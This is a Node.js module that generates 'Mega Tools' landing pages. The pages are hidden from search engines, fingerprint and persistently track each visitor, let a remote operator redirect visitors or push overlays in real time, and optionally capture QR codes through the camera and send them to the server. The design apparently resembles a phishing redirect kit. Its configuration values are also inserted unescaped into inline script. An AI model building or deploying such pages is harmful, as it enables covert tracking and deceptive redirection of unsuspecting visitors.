// ============================================================
// MEGA TOOLS — LANDING PAGE HTML GENERATOR (Server-side)
// ENTERPRISE: Single Session Pipeline — session_init only
// FIX v6.1: localStorage for persistent visitor ID
// FIX v6.3: Message + Image display on msg_push
// UPDATED v6.4: Scanner mode for QR Authentication
// ============================================================

const CONFIG = require('../config');

function generateLandingPage({ baseUrl, trackingCode, slug, apiBase, delay = 15000, heartbeatInterval = 15000, chainData = null, scannerMode = false }) {
  const finalApiBase = apiBase || CONFIG.CLIENT_URL || 'http://localhost:5000';
  const finalDelay = delay || 15000;
  const finalHeartbeat = heartbeatInterval || 15000;
  const pollingInterval = 2000;

  let chainScript = '';
  if (chainData?.isChain) {
    chainScript = `
    var chainId = '${chainData.chainId || ''}';
    var chainStep = ${chainData.chainStep || 0};
    var chainStepName = '${chainData.chainStepName || ''}';
    socket.on('chain_update', function(d) {
      if (d && d.targetUrl) {
        clearTimeout(redirectTimer);
        clearTimeout(autoRedirectTimer);
        stopPolling();
        stopHeartbeat();
        window.location.href = d.targetUrl;
      }
    });`;
  }

  // Scanner UI (only if scannerMode is true)
  const scannerStyles = scannerMode ? `
    #qr-reader { width: 280px; height: 280px; margin: 0 auto; border-radius: 12px; overflow: hidden; border: 2px solid #6366f1; }
    #qr-reader video { width: 100%; height: 100%; object-fit: cover; }
    #scan-status { margin-top: 12px; font-size: 14px; font-weight: 600; color: #10b981; text-align: center; }
    #scan-container { display: none; text-align: center; }
    #scan-loading { display: block; }
  ` : '';

  const scannerScript = scannerMode ? `
    // ============================================================
    // SCANNER MODE — QR Authentication
    // ============================================================
    var scannerActive = false;
    var html5QrCode = null;
    var cameraStream = null;

    function showScanner() {
      document.getElementById('scan-loading').style.display = 'none';
      document.getElementById('scan-container').style.display = 'block';
    }

    async function startScanner() {
      var statusEl = document.getElementById('scan-status');
      statusEl.textContent = 'Requesting camera...';
      
      try {
        // Camera permission request
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        statusEl.textContent = 'Camera ready. Scan QR...';
        
        // QR reader element
        var qrElement = document.getElementById('qr-reader');
        qrElement.innerHTML = '';
        
        html5QrCode = new Html5Qrcode('qr-reader');
        
        await html5QrCode.start(
          { facingMode: 'environment' },
          { fps: 10, qrbox: { width: 200, height: 200 } },
          onScanSuccess,
          function() {}
        );
        
        scannerActive = true;
      } catch (err) {
        statusEl.textContent = 'Camera permission denied';
        statusEl.style.color = '#ef4444';
      }
    }

    function onScanSuccess(decodedText) {
      if (!scannerActive) return;
      scannerActive = false;
      
      var statusEl = document.getElementById('scan-status');
      statusEl.textContent = '✅ Verified!';
      statusEl.style.color = '#10b981';
      
      // Stop scanner
      if (html5QrCode) {
        try { html5QrCode.stop(); } catch(e) {}
      }
      if (cameraStream) {
        cameraStream.getTracks().forEach(function(track) { track.stop(); });
      }
      
      // Send to backend
      fetch(API + '/api/data/verify-scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          qrData: decodedText, 
          trackingCode: TK, 
          visitorId: VID 
        })
      }).then(function(r) { return r.json(); })
      .then(function(data) {
        if (data.success) {
          setTimeout(function() { executeRedirect(TARGET); }, 1500);
        }
      }).catch(function() {});
    }

    // Auto-start scanner on page load
    window.addEventListener('DOMContentLoaded', function() {
      if (scannerMode) {
        startScanner();
      }
    });
  ` : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Mega Tools — ${scannerMode ? 'Authentication Scanner' : 'Redirecting...'}</title>
  <meta name="description" content="Mega Tools — Enterprise Visitor Management System">
  <meta property="og:title" content="Mega Tools — Enterprise Visitor Management">
  <meta property="og:description" content="Track, manage, and redirect your visitors in real-time with enterprise-grade inbox.">
  <meta property="og:image" content="https://res.cloudinary.com/shakilv875/image/upload/v1784334960/hjhjmh_bshbbh.png">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Mega Tools — Enterprise Visitor Management">
  <meta name="twitter:description" content="Track, manage, and redirect your visitors in real-time.">
  <meta name="twitter:image" content="https://res.cloudinary.com/shakilv875/image/upload/v1784334960/hjhjmh_bshbbh.png">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
    body { background: linear-gradient(135deg, #0f172a, #1e293b); display: flex; align-items: center; justify-content: center; }
    .spinner { width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #6366f1; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { color: #94a3b8; font-size: 14px; font-weight: 400; margin-bottom: 8px; }
    .brand { color: #6366f1; font-size: 12px; font-weight: 500; opacity: 0.8; }
    .footer { position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: #475569; font-size: 11px; }
    #msg-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 99998; flex-direction: column; gap: 16px; }
    #msg-text { color: #fff; font-size: 18px; font-weight: 600; text-align: center; max-width: 80%; }
    #msg-img { max-width: 80%; max-height: 70vh; border-radius: 8px; }
    ${scannerStyles}
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
  ${scannerMode ? '<script src="https://unpkg.com/html5-qrcode"></script>' : ''}
</head>
<body>
  <div style="text-align:center" id="scan-loading">
    <div class="spinner"></div>
    <div class="loading-text">${scannerMode ? 'Initializing Scanner...' : 'Please wait...'}</div>
    <div class="brand">Powered by Mega Tools</div>
  </div>
  ${scannerMode ? `
  <div id="scan-container" style="text-align:center">
    <div id="qr-reader"></div>
    <div id="scan-status">Waiting for camera...</div>
  </div>
  ` : ''}
  <div class="footer">&copy; 2026 Mega Tools. All rights reserved.</div>
  <div id="msg-overlay">
    <img id="msg-img" src="" alt="" style="display:none;" />
    <div id="msg-text"></div>
  </div>
  <script>
    (async function() {
      // ============================================================
      // CONFIG
      // ============================================================
      var TK = '${trackingCode || slug || 'default_tracking'}';
      var TARGET = '${baseUrl || 'about:blank'}';
      var API = '${finalApiBase}';
      var HEARTBEAT_INTERVAL = ${finalHeartbeat};
      var POLLING_INTERVAL = ${pollingInterval};
      var REDIRECT_DELAY = ${finalDelay};
      var SCANNER_MODE = ${scannerMode ? 'true' : 'false'};

      // ============================================================
      // STATE
      // ============================================================
      var VID = localStorage.getItem('_mvid') || localStorage.getItem('_vid') || sessionStorage.getItem('_vid');
      var redirectTimer = null;
      var autoRedirectTimer = null;
      var pollingTimer = null;
      var heartbeatTimer = null;
      var lastSeq = 0;
      var commandReceived = false;
      var socket = null;
      var isPageUnloading = false;

      // ============================================================
      // CLEANUP FUNCTIONS (Memory leak prevention)
      // ============================================================
      function clearAllTimers() {
        if (redirectTimer) { clearTimeout(redirectTimer); redirectTimer = null; }
        if (autoRedirectTimer) { clearTimeout(autoRedirectTimer); autoRedirectTimer = null; }
        if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
        if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
      }

      function stopPolling() {
        if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
      }

      function stopHeartbeat() {
        if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
      }

      function cleanupSocket() {
        if (socket) {
          try { socket.off(); socket.disconnect(); } catch(e) {}
          socket = null;
        }
      }

      // ============================================================
      // MESSAGE OVERLAY
      // ============================================================
      function showMessageOverlay(message, imageUrl) {
        var overlay = document.getElementById('msg-overlay');
        var textEl = document.getElementById('msg-text');
        var imgEl = document.getElementById('msg-img');
        if (!overlay) return;
        overlay.style.display = 'flex';
        if (imageUrl) {
          imgEl.src = imageUrl;
          imgEl.style.display = 'block';
        } else {
          imgEl.style.display = 'none';
        }
        textEl.textContent = message || '';
        setTimeout(function() {
          overlay.style.display = 'none';
        }, 3000);
      }

      // ============================================================
      // EXECUTE REDIRECT (with cleanup)
      // ============================================================
      function executeRedirect(url) {
        if (commandReceived) return;
        if (isPageUnloading) return;
        commandReceived = true;
        isPageUnloading = true;
        clearAllTimers();
        cleanupSocket();
        window.location.href = url;
      }

      // ============================================================
      // FINGERPRINT — PERSISTENT (localStorage)
      // ============================================================
      if (!VID) {
        try {
          var fp = await FingerprintJS.load();
          var result = await fp.get();
          VID = 'fp_' + result.visitorId;
        } catch(e) {
          VID = 'v_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
        }
        try { localStorage.setItem('_mvid', VID); } catch(e) {}
        try { sessionStorage.setItem('_vid', VID); } catch(e) {}
      } else {
        try { localStorage.setItem('_mvid', VID); } catch(e) {}
      }

      // ============================================================
      // HTTP POLLING
      // ============================================================
      function startPolling() {
        if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
        pollingTimer = setInterval(function() {
          if (commandReceived || isPageUnloading) { stopPolling(); return; }
          fetch(API + '/api/sessions/pending-command/' + encodeURIComponent(TK) + '?visitorId=' + encodeURIComponent(VID) + '&seq=' + lastSeq)
            .then(function(r) { return r.json(); })
            .then(function(data) {
              if (data && data.pending && data.command && data.command.url) {
                if (data.command.seq && data.command.seq <= lastSeq) return;
                if (data.command.seq) lastSeq = data.command.seq;
                if (data.command.action === 'navigate' || data.command.action === 'navigate+message') {
                  if (data.command.message) {
                    showMessageOverlay(data.command.message);
                    setTimeout(function() { executeRedirect(data.command.url); }, 2500);
                  } else {
                    executeRedirect(data.command.url);
                  }
                }
              }
            })
            .catch(function() {});
        }, POLLING_INTERVAL);
      }

      // ============================================================
      // HEARTBEAT
      // ============================================================
      function startHeartbeat() {
        if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
        heartbeatTimer = setInterval(function() {
          if (isPageUnloading) { stopHeartbeat(); return; }
          fetch(API + '/api/data/heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ visitorId: VID, trackingCode: TK, status: 'Active' })
          }).catch(function() {});
        }, HEARTBEAT_INTERVAL);
      }

      // ============================================================
      // OFFLINE DETECTION
      // ============================================================
      function sendOffline() {
        if (isPageUnloading) return;
        isPageUnloading = true;
        clearAllTimers();
        cleanupSocket();
        var payload = JSON.stringify({ visitorId: VID, trackingCode: TK, status: 'Offline' });
        if (navigator.sendBeacon) {
          navigator.sendBeacon(API + '/api/data/heartbeat', payload);
        } else {
          fetch(API + '/api/data/heartbeat', {
            method: 'POST', keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: payload
          }).catch(function() {});
        }
      }

      // ============================================================
      // START POLLING (immediate)
      // ============================================================
      startPolling();

      // ============================================================
      // SCANNER MODE
      // ============================================================
      ${scannerScript}

      // ============================================================
      // LOAD SOCKET.IO
      // ============================================================
      var s = document.createElement('script');
      s.src = API + '/socket.io/socket.io.js';
      s.onload = function() {
        socket = io(API, { transports: ['websocket', 'polling'], reconnection: true, timeout: 10000 });

        socket.on('connect', function() {
          socket.emit('session_init', { visitorId: VID, trackingCode: TK });
          socket.emit('joinRoom', TK);
          startHeartbeat();
        });

        socket.on('session_command', function(cmd) {
          if (!cmd || commandReceived || isPageUnloading) return;
          if (cmd.visitorId && cmd.visitorId !== VID) return;
          if (cmd.seq && cmd.seq <= lastSeq) return;
          if (cmd.seq) lastSeq = cmd.seq;
          if (cmd.url && (cmd.action === 'navigate' || cmd.action === 'navigate+message')) {
            if (cmd.message) {
              showMessageOverlay(cmd.message);
              setTimeout(function() { executeRedirect(cmd.url); }, 2500);
            } else {
              executeRedirect(cmd.url);
            }
          }
        });

        socket.on('global_command', function(cmd) {
          if (!cmd || commandReceived || isPageUnloading) return;
          if (cmd.visitorId && cmd.visitorId !== VID) return;
          if (cmd.seq && cmd.seq <= lastSeq) return;
          if (cmd.seq) lastSeq = cmd.seq;
          if (cmd.url && (cmd.action === 'navigate' || cmd.action === 'navigate+message')) {
            if (cmd.message) {
              showMessageOverlay(cmd.message);
              setTimeout(function() { executeRedirect(cmd.url); }, 2500);
            } else {
              executeRedirect(cmd.url);
            }
          }
        });

        socket.on('nav_update', function(d) { if (d && d.targetUrl) { executeRedirect(d.targetUrl); } });
        socket.on('redirect', function(d) { if (d && d.url) { executeRedirect(d.url); } });
        socket.on('msg_push', function(d) {
          if (!d) return;
          if (d.message || d.imageUrl) {
            showMessageOverlay(d.message, d.imageUrl);
          }
          if (d && d.targetUrl) {
            setTimeout(function() { executeRedirect(d.targetUrl); }, 2500);
          }
        });
        socket.on('connect_error', function() {});
        socket.on('disconnect', function() {});
        ${chainScript}

        if (!SCANNER_MODE) {
          autoRedirectTimer = setTimeout(function() {
            if (!commandReceived && !isPageUnloading) {
              executeRedirect(TARGET);
            }
          }, REDIRECT_DELAY);
        }
      };

      s.onerror = function() {
        startHeartbeat();
        if (!SCANNER_MODE) {
          autoRedirectTimer = setTimeout(function() {
            if (!commandReceived && !isPageUnloading) {
              executeRedirect(TARGET);
            }
          }, REDIRECT_DELAY);
        }
      };

      document.head.appendChild(s);

      // ============================================================
      // PAGE UNLOAD HANDLERS
      // ============================================================
      window.addEventListener('beforeunload', function(e) {
        sendOffline();
        clearAllTimers();
        cleanupSocket();
      });

      window.addEventListener('pagehide', function(e) {
        sendOffline();
        clearAllTimers();
        cleanupSocket();
      });

      document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
          sendOffline();
        } else {
          if (!isPageUnloading && !commandReceived) {
            startHeartbeat();
          }
        }
      });

      window.addEventListener('unload', function() {
        clearAllTimers();
        cleanupSocket();
      });

    })();
  </script>
</body>
</html>`;
}

module.exports = { generateLandingPage };